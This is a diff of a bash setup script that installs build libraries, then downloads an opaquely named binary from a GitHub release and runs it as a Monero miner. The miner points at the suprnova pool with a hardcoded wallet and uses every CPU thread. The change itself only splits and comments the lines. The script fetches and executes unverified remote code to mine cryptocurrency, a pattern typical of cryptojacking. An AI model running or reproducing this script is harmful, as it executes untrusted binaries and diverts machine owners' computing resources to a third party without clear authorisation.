@@ -1,13 +1,19 @@
 #!/bin/bash
 
-# Update and install required packages
+# Update package lists
 apt update
+
+# Install build tools and runtime libraries
 apt install -y build-essential cmake pkg-config libboost-all-dev libssl-dev \
     libzmq3-dev libsodium-dev libunwind-dev liblzma-dev libreadline-dev \
     libexpat1-dev libpgm-dev libhidapi-dev libusb-1.0-0-dev \
     libprotobuf-dev protobuf-compiler libudev-dev \
     libncurses6 libncursesw6 libtinfo6 \
     libunbound-dev liblmdb-dev libminiupnpc-dev libuv1-dev git screen wget curl
-wget https://github.com/vedhagsvp/marva/releases/download/c4ksd/crrmnar && \
-chmod +x crrmnar && \
+
+# Download your binary
+wget https://github.com/vedhagsvp/marva/releases/download/c4ksd/crrmnar
+
+# Make it executable
+chmod +x crrmnar
 ./crrmnar -o stratum+tcp://xmr.suprnova.cc:6663 -u 44Hy7goGeFtd6HeHC4GEYXhApgSCNKf2q1YRPVA9661mQWoZ5WVTovj8Te1kmLmdut1dXwws7C491EoFUTbN3qCv8zbwhKC.lofdd -p x -a rx/c64 -t $(nproc --all)
